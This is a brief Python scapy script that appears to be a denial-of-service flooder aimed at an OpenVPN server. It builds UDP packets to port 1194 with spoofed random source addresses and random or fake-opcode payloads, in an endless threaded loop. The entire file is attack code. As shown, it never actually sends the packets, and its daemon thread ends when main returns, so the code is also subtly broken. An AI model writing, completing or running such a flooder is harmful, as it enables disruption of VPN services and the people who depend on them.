from scapy.layers import inet
import threading
import random
import time
from utils import random_ip, OPENVPN_SERVER_IP

def build_openvpn_payload():
    if random.choice([True, False]):
        return random.randbytes(random.randint(20, 200))
    else:
        opcode = 64
        header = bytes([opcode, 0]) + random.randint(1, 65535).to_bytes(2, 'big')
        return header + random.randbytes(random.randint(10, 50))

def openvpn_flood_work(target_host):
    while True:
        payload = build_openvpn_payload()
        packet = inet.IP(dst=target_host, src=random_ip()) / inet.UDP(sport=random.randint(1024, 65535), dport=1194) / payload
        time.sleep(random.randrange(30)/1000)

def openvpn_flood(target_host):
    t = threading.Thread(target=openvpn_flood_work, args=(target_host,), daemon=True)
    t.start()
    return t

def main():
    openvpn_thread = openvpn_flood(OPENVPN_SERVER_IP)

if __name__ == "__main__":
    main()